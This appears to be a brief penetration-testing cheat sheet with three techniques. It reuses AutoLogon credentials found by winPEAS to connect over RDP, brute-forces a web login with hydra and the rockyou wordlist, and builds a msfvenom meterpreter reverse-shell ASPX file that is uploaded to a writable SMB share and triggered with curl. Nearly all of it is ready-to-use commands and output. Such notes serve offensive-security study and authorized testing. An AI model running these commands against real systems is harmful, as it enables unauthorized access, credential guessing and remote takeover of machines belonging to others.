AutoLogon creds
-
During our privilege escalation proccess, if we got this creds using ```winPEAS.exe``` binary we could use them to RDP over the target machine.
![Screenshot from 2024-10-06 00-51-57](https://github.com/user-attachments/assets/9baed7c0-548c-4a51-9a5e-149b51864e14)

```
xfreerdp /u:administrator /p:<password> /v:<target ip>
```

Brute force login pages using hydra
-

```
sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
```
After filling in the placeholders, here’s our actual command!

```
sudo hydra -s 80 -L ~/path/to/our/nameslist -P /usr/share/wordlists/rockyou.txt <our target> https-post-form "/login/index.php:username=^USER^&password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
```

Since the network share from ‘test’ is writeable, we can use it for a reverse shell.

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<our ip> lport=1234 -f aspx -o shell.aspx
```
Then upload the reverse shell file to the network share.
```
└─$ smbclient \\\\<targetIp>\\test
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (149.1 kb/s) (average 149.1 kb/s)
```
Create a listener on the attacker’s machine useing `exploit/multi/handler` 

Finally, Invoke the reverse shell we uploaded to the network share.
```
└─$ curl http://<targetIp>/test/shell.aspx
```
We got the reverse shell
